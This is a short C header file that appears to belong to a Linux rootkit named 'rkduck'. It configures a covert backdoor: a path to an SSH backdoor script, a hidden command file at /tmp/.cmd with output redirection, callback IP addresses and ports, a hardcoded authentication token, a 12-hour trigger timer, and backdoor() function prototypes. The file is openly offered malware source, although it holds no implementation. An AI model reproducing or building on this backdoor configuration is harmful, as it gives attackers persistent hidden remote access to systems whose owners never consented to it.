#ifndef _BACKDOOR_H_
#define _BACKDOOR_H_

#include "common.h"

#define ALLOW_SSH 0
#define BCK_SSH "/bin/bash /root/rkduck/bck_ssh.sh"

#define REDIRECT " > "
#define PATH "/tmp/.cmd"

#define IP_DEST "127.0.0.1"
#define PORT_DEST 2424

#define IP_SOURCE "127.0.0.1"
#define PORT_SRC 5000

#define AUTH_TOKEN 0x12345678
#define TIMER_BACKDOOR 43200 //12H

void backdoor(void);
void backdoor_exit (void);

#endif /* _BACKDOOR_H_ */